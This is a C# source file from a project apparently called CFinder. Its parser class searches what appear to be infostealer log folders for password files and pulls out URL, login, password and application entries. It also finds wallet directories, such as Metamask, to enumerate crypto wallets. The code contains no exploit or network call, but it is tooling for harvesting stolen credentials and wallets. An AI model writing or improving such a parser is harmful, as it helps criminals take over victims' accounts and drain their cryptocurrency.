using CFinder.Application.Models.CryptoFinderModels;
using CFinder.Application.Models.Result;
using CFinder.Application.Models.Settings;
using CFinder.Domain.Log;
using CFinder.Domain.Settings;

namespace CFinder.Application.ServerMethods.Base;

public class LogParserServerMethod
{
    private static readonly string[] URL_STRINGS = {
        "url", "link", "host"
    };

    private static readonly string[] LOGIN_STRINGS = {
        "user", "login"
    };
    
    private static readonly string[] APPLICATION_STRINGS = {
        "soft", "app"
    };
    
    private static readonly string[] PASSWORD_STRINGS = {
        "pass"
    };

    
    public virtual async Task<LogDto> FullParseLog(string path, ParserSettingsDto parserSettings)
    {
        return new LogDto()
        {
            Directory = path,
            Files = await GetFiles(path),
            Authentications = await GetAuthentication(path, parserSettings.ParsingType),
            Wallets = new List<WalletDto>()
        };
    }
    
    /// <summary>
    /// Get all files in Log
    /// </summary>
    /// <param name="directory">Log Directory</param>
    /// <returns></returns>
    public virtual async Task<string[]> GetFiles(string directory)
    {
        await Task.CompletedTask;
        return Directory
            .GetFiles(directory, "*", SearchOption.AllDirectories)
            .ToArray();
    }
    /// <summary>
    /// Search for the Password.txt file in the log folder and parse it
    /// </summary>
    /// <param name="directory">Log directory</param>
    /// <param name="parsingType">Parsing of the type</param>
    /// <returns>List AuthenticationDto</returns>
    public virtual async Task<List<AuthenticationDto>> GetAuthentication(string directory, AuthParsingType parsingType = AuthParsingType.FullParsing)
    {
        await Task.CompletedTask;

        var authList = new List<AuthenticationDto>();

        if (!Directory.Exists(directory))
            return authList;
        
        var passwordFile = Directory
            .GetFiles(directory, "*", SearchOption.AllDirectories)
            .FirstOrDefault(x => x.Contains("password", StringComparison.OrdinalIgnoreCase));
        if (passwordFile == null)
            return authList;

        return await ParsePasswordFile(passwordFile, parsingType);
    }
    
    /// <summary>
    /// Получить список кошельков
    /// </summary>
    /// <param name="directory">Папка с логом</param>
    /// <returns></returns>
    public virtual async Task<ICollection<BaseWallet>> GetWalelts(string directory)
    {
        var walletList = new List<BaseWallet>();
        var walletDirectory = GetWalletDirectory(directory);
        if (!Directory.Exists(walletDirectory))
        {
            return walletList;
        }
        
        var walletsDirectories = Directory.GetDirectories(walletDirectory);
        var walletNames = Enum.GetNames<Wallet.WalletType>();
        
        foreach (var walletsDirectory in walletsDirectories)
        {
            var foundWallet = walletNames
                .FirstOrDefault(term => walletsDirectory.Contains(term, StringComparison.OrdinalIgnoreCase));
            
            if(foundWallet == null)
                continue;
            
            var walletEnum = Enum.Parse<Wallet.WalletType>(foundWallet);

            switch (walletEnum)
            {
                case Wallet.WalletType.Metamask:
                    walletList.Add(new Metamask(walletsDirectory));
                    break;
            }
        }

        await Task.CompletedTask;
        return walletList;
    }
    
    /// <summary>
    /// Парсить файл с паролем
    /// </summary>
    /// <param name="passwordFile"></param>
    /// <returns></returns>
    private async Task<List<AuthenticationDto>> ParsePasswordFile(string passwordFile, AuthParsingType parsingType)
    {
        var authsList = new List<AuthenticationDto>();

        using (var streamReader = new StreamReader(passwordFile))
        {
            while (!streamReader.EndOfStream)
            {
                var auth = new AuthenticationDto();

                for (var i = 0; i < 4; i++)
                {
                    var line = await streamReader.ReadLineAsync();

                    if (line == null)
                        break;

                    var parts = line.Split(new[] { ':' }, 2);
                    if (parts.Length != 2)
                        continue;

                    var startString = parts[0].Trim();
                    var endString = parts[1].Trim();

                    if (CheckContainsSubword(PASSWORD_STRINGS, startString))
                    {
                        auth.Password = endString;
                    }
                    else if(CheckContainsSubword(URL_STRINGS, startString) && 
                            parsingType == AuthParsingType.FullParsing)
                    {
                        auth.Link = endString;
                    }
                    else if (CheckContainsSubword(LOGIN_STRINGS, startString) &&
                             (parsingType == AuthParsingType.FullParsing || parsingType == AuthParsingType.LoginAndPassword))
                    {
                        auth.Login = endString;
                    }
                    else if (CheckContainsSubword(APPLICATION_STRINGS, startString) && parsingType == AuthParsingType.FullParsing)
                    {
                        auth.Application = endString;
                    }
                }

                authsList.Add(auth);
            }
        }

        return authsList;
    }

    private bool CheckContainsSubword(string[] array, string startString)
    {
        return array.Any(x => startString.Contains(x, StringComparison.OrdinalIgnoreCase));
    }

    /// <summary>
    /// Получить директорую .../wallet
    /// </summary>
    /// <param name="directory">Папка с логом</param>
    /// <returns></returns>
    private string? GetWalletDirectory(string directory)
    {
        string? walletDirectory = null;
          
        var stringWithWallet = Directory
            .GetFiles(directory, "*", SearchOption.AllDirectories)
            .FirstOrDefault(x => x.Contains("allet", StringComparison.OrdinalIgnoreCase));
        if (stringWithWallet == null)
            return null;

        var splitDirectory = stringWithWallet.Split("\\");

        foreach (var splitElement in splitDirectory)
        {
            walletDirectory = Path.Combine(walletDirectory ?? "", splitElement);
            if(splitElement.Contains("wallet", StringComparison.OrdinalIgnoreCase))
                break;
        }

        return walletDirectory;
    }
}